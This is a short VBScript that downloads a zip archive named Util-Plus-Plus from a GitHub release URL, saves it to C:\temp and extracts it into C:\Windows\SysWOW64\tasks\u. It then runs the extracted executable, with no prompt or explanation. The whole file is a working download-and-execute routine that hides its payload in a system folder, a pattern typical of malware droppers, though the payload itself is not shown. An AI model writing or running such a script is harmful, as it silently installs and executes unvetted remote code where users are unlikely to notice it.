dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/idk-v1/Util-Plus-Plus/releases/latest/download/util-plus-plus.zip", False
xHttp.Send()

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "C:\temp\Util-Plus-Plus.zip", 2
end with

ZipFile = "C:\temp\Util-Plus-Plus.zip"
ExtractTo= "C:\Windows\SysWOW64\tasks\u\Util-Plus-Plus"
Set fso = CreateObject("Scripting.FileSystemObject")
If NOT fso.FolderExists(ExtractTo) Then
   fso.CreateFolder(ExtractTo)
End If
set objShell = CreateObject("Shell.Application")
set FilesInZip=objShell.NameSpace(ZipFile).items
objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)

Set ws = WScript.CreateObject("WScript.Shell")
ws.Run("C:\Windows\SysWOW64\tasks\u\Util-Plus-Plus\Util-Plus-Plus.exe")